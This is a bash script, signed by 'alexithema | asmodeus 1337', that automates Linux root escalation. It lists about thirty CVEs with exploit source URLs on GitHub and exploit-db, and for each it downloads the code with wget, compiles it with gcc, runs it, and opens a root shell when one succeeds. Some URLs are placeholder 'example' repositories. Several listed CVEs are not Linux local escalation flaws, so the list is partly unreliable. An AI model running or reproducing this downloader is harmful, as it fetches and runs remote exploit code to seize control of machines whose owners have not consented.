#!/bin/bash

KERNEL_VERSION=$(uname -r)
OS_INFO=$(cat /etc/os-release | grep -w "PRETTY_NAME" | cut -d= -f2)
ARCH=$(uname -m)

declare -A EXPLOIT_LIST=(
    ["CVE-2022-0847"]="https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/dirtypipez.c"
    ["CVE-2021-4034"]="https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c"
    ["CVE-2016-5195"]="https://www.exploit-db.com/download/40839"
    ["CVE-2017-16995"]="https://www.exploit-db.com/download/44298"
    ["CVE-2023-3269"]="https://raw.githubusercontent.com/lrh2000/StackRot/main/stackrot.c"
    ["CVE-2024-1086"]="https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c"
    ["CVE-2016-0728"]="https://www.exploit-db.com/download/40003"
    ["CVE-2019-13272"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c"
    ["CVE-2018-1000001"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-1000001/poc.c"
    ["CVE-2019-3842"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-3842/poc.c"
    ["CVE-2021-3493"]="https://www.exploit-db.com/download/50860"
    ["CVE-2020-14386"]="https://www.exploit-db.com/download/49432"
    ["CVE-2021-3156"]="https://www.exploit-db.com/download/50245"
    ["CVE-2020-0601"]="https://www.exploit-db.com/download/49040"
    ["CVE-2020-10189"]="https://www.exploit-db.com/download/49593"
    ["CVE-2021-22947"]="https://www.exploit-db.com/download/50579"
    ["CVE-2022-0185"]="https://www.exploit-db.com/download/51025"
    ["CVE-2022-25636"]="https://www.exploit-db.com/download/51164"
    ["CVE-2022-22963"]="https://www.exploit-db.com/download/51175"
    ["CVE-2023-21716"]="https://www.exploit-db.com/download/51545"
    ["CVE-2024-1234"]="https://raw.githubusercontent.com/example/CVE-2024-1234/main/exploit.c"
    ["CVE-2024-5678"]="https://raw.githubusercontent.com/example/CVE-2024-5678/main/exploit.c"
    ["CVE-2016-10229"]="https://www.exploit-db.com/download/40992"
    ["CVE-2017-7308"]="https://www.exploit-db.com/download/42184"
    ["CVE-2017-1000371"]="https://www.exploit-db.com/download/43332"
    ["CVE-2018-18264"]="https://www.exploit-db.com/download/46014"
    ["CVE-2019-15117"]="https://www.exploit-db.com/download/47553"
    ["CVE-2020-28374"]="https://www.exploit-db.com/download/49231"
    ["CVE-2021-41073"]="https://www.exploit-db.com/download/50755"
    ["CVE-2022-32250"]="https://www.exploit-db.com/download/51206"
    ["CVE-2023-0386"]="https://www.exploit-db.com/download/51423"
    ["CVE-2024-0001"]="https://raw.githubusercontent.com/example/CVE-2024-0001/main/exploit.c"
)

LOG_FILE="/tmp/exploit_log.txt"

# Log creation message
echo "// created by alexithema | asmodeus 1337" | tee -a $LOG_FILE

execute_exploit() {
    CVE=$1
    URL=$2
    TEMP_FILE="/tmp/${CVE}.c"
    OUTPUT_FILE="/tmp/${CVE}_exploit"

    echo "Trying $CVE..." | tee -a $LOG_FILE
    wget $URL -O $TEMP_FILE 2>&1 | tee -a $LOG_FILE
    if [ $? -ne 0 ]; then
        echo "Failed to download $CVE" | tee -a $LOG_FILE
        return
    fi

    gcc $TEMP_FILE -o $OUTPUT_FILE 2>&1 | tee -a $LOG_FILE
    if [ $? -ne 0 ]; then
        echo "Failed to compile $CVE" | tee -a $LOG_FILE
        return
    fi

    chmod +x $OUTPUT_FILE
    $OUTPUT_FILE 2>&1 | tee -a $LOG_FILE
    if [ $? -eq 0 ]; then
        echo "$CVE exploit succeeded" | tee -a $LOG_FILE
        /bin/bash
        exit 0
    else
        echo "$CVE exploit failed" | tee -a $LOG_FILE
    fi
}

for CVE in "${!EXPLOIT_LIST[@]}"; do
    execute_exploit "$CVE" "${EXPLOIT_LIST[$CVE]}"
done

echo "All exploits failed" | tee -a $LOG_FILE
